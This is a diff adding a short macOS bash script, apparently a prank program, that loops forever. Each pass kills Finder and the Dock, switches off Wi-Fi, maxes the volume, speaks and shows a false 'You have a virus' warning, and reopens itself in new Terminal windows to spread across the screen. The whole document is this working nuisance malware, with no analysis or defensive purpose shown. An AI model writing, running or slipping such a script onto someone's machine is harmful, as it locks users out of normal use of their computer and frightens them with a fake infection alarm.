@@ -1,0 +1,17 @@
+#!/bin/bash
+while true; do
+#Kill Finder & Dock, to make it harder to launch new applications
+killall Finder
+killall Dock
+#Kill wifi, just for fun
+networksetup -setairportpower en1 off
+#Make an error sound
+osascript -e 'beep'
+#Set the volume to max, then say "You have a virus"
+osascript -e "set volume 7"
+say You have a virus
+#Self-replicate.
+open -a Terminal.app ~/trollingnl
+#Show the You have a virus dialog
+osascript -e 'tell app "Finder" to display dialog "You have a virus!"'
+done
